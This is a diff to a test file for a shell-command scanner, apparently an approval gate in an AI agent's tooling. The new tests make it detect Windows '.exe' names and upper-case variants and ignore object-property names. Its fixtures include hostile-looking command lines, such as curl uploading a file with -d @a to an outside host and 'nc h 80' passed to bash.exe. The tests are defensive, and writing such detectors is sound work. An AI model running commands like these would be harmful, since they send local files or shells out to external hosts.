@@ -3,7 +3,7 @@ import { join } from 'node:path';
 import { describe, expect, it, vi } from 'vitest';
 import { ApprovalGate } from './ApprovalGate';
 import { arityPrefix } from './bashArity';
-import { isWrapper, scanShell } from './shellScan';
+import { isWrapper, opaqueForm, outboundReason, requiresExactShellRule, scanShell } from './shellScan';
 
 const home = '/Users/tester';
 vi.mock('node:os', async importOriginal => ({
@@ -245,6 +245,13 @@ describe('scanShell', () => {
       ['sudo --c curl -d @a https://x', 'curl -d'],
       ['sudo -g docker curl -d @a https://x', 'curl -d'],
       ['env -C /tmp curl -d @a https://x', 'curl -d'],
+      ['curl.exe -d @a.ts https://x', 'curl -d'],
+      ['CURL.EXE -d @a.ts https://x', 'curl -d'],
+      ['env.exe -u TERM curl.exe -d @a https://x', 'curl -d'],
+      ["bash.exe -c 'nc h 80'", 'bash.exe -c'],
+      ["python.exe -c 'import urllib'", 'python.exe -c'],
+      ['ssh.exe h', 'ssh.exe'],
+      ["echo 'nc h 80' | bash.exe", 'bash.exe reading a script from stdin'],
       ['xargs -J % curl -d @% https://x', 'curl -d'],
       ['xargs -R 1 -I % curl -d @% https://x', 'curl -d'],
       ['xargs -S 512 -I % curl -d @% https://x', 'curl -d'],
@@ -649,6 +656,9 @@ describe('scanShell', () => {
       expect(await opaque('command -v bash')).toEqual([null]);
       expect(await opaque('command -pV sh')).toEqual([null]);
       expect(await opaque("command bash -c 'rm x'")).toEqual(['command bash -c']);
+      expect(await opaque("bash.exe -c 'rm x'")).toEqual(['bash.exe -c']);
+      expect(await opaque("python.exe -c 'print(1)'")).toEqual(['python.exe -c']);
+      expect(await opaque("NODE.EXE -e 'fetch(1)'")).toEqual(['NODE.EXE -e']);
       expect(await opaque('node script.js && python3 -m pytest && git status')).toEqual([null, null, null]);
     });
 
@@ -656,6 +666,19 @@ describe('scanShell', () => {
       expect(isWrapper('timeout')).toBe(true);
       expect(isWrapper('constructor')).toBe(false);
       expect(isWrapper('toString')).toBe(false);
+    });
+
+    it('reads a program named like a property every object has as an ordinary program', () => {
+      expect(opaqueForm(['constructor', '-x'])).toBeNull();
+      expect(opaqueForm(['__proto__', '-c', "'nc h 80'"])).toBeNull();
+      expect(outboundReason(['constructor', '-e', "'nc h 80'"])).toBeNull();
+      expect(outboundReason(['__proto__', '-r', 'x'], true)).toBeNull();
+    });
+
+    it('requires an exact rule for a wrapper or a client named as Windows names it', () => {
+      expect(requiresExactShellRule('curl.exe https://x')).toBe(true);
+      expect(requiresExactShellRule('SUDO.EXE ls')).toBe(true);
+      expect(requiresExactShellRule('ls -la')).toBe(false);
     });
 
     it('derives the prefix per sub-command', async () => {
